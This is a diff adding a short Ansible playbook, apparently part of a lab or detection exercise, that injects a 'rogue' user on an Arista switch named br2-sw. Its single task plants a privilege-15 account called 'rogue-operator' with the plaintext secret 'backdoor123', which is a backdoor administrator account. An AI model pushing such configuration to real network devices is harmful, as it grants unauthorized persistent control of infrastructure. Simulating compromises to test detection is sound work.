@@ -1,0 +1,9 @@
+---
+- name: Inject Rogue User - Add suspicious user to br2-sw
+  hosts: br2-sw
+  gather_facts: no
+  tasks:
+    - name: Add rogue user
+      arista.eos.eos_config:
+        lines:
+          - "username rogue-operator privilege 15 secret 0 backdoor123"
